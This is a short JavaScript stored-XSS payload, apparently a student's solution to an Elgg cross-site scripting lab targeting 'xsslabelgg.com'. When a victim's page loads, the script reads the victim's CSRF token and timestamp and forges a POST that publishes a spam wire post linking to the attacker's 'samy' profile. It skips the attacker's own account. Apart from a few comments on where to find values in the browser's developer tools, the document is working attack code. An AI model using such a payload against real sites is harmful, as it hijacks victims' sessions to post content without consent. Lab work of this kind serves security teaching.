<script type="text/javascript">
	window.onload = function(){
	
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	//var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var token="__elgg_token="+elgg.security.token.__elgg_token;

	var a = document.createElement('a'); 
	a.href = "http://www.xsslabelgg.com/profile/samy"; 

	var sendurl="http://www.xsslabelgg.com/action/thewire/add";
	// When the post button is pressed , 
	//then the url appears in :(Inspect-> Network -> POST -> Headers -> Request URL)

	var content=token+ts+"&body=To earn 12 USD/Hour(!), visit now "+a;
	//When the post button is pressed , 
	//then the posted content appears in :(Inspect-> Network -> POST -> Headers -> Edit & Resend -> Request body)
	
	
	if(elgg.session.user.guid!=47)
	{
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
	}
</script>

